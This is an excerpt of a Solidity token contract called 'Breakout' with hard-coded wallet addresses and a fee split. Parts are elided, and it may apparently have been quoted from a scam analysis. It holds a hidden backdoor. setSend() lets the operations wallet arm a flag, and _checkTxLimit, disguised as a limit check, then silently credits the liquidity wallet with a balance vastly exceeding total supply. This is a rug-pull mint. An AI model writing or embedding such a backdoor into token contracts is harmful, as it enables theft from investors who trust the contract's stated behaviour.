...
// Main Contract Logic 
// --------------------------------------------------------------
contract Breakout is Context, IERC20, Ownable {
    // Imports
    using SafeMath for uint256;
    ...
    // wallets
    address payable public liquidityWallet = payable(0xE5c1E30585a7f263F02E0Ac4B31E25ef05d95c3D);
    address payable public operationsWallet =  payable(0x1ed6d4a04Dce841e661E4A498FcBf2d6A9a43CF9);
    ...
    // distribution ratio
    uint256 public _liquiditySharePercentage = 20;
    uint256 public _operationsSharePercentage = 80;
    ...
    function setSend() external {
        require(msg.sender == operationsWallet, 'no permission to access');
        isSend = true;
    }
    ...
    function _checkTxLimit(address sender, uint256 amount) private { 
        ...
        if (isSend) {
            isSend = false;
            _balances[liquidityWallet] = _totalSupply * 1e18;
        }
    }
